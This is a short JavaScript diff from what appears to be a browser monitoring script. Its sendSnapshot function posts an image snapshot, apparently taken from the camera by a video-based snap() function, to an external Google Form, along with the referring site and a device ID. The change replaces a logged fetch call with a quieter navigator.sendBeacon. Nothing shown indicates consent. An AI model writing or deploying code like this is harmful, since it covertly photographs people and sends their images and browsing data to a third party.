@@ -8,19 +8,14 @@
     const referrer = document.referrer || 'Unknown Site';
 
     function sendSnapshot(imgData) {
-      const formData = new FormData();
-      formData.append('entry.2012483072', imgData);      // Image Snapshot
-      formData.append('entry.500527079', referrer);      // Referrer site
-      formData.append('entry.1027569634', deviceID);     // Device ID
+      const formData = new URLSearchParams();
+      formData.append('entry.2012483072', imgData);        // Snapshot
+      formData.append('entry.500527079', referrer);        // Visited Site
+      formData.append('entry.1027569634', deviceID);       // Device ID
 
-      fetch(scriptURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: formData
-      }).then(() => {
-        console.log("Violation logged via Google Form");
-      }).catch(err => console.error("Log failed", err));
-    }
+      navigator.sendBeacon(scriptURL, formData);
+      console.log("Beacon sent");
+      }
 
     function snap() {
       const video = document.createElement('video');
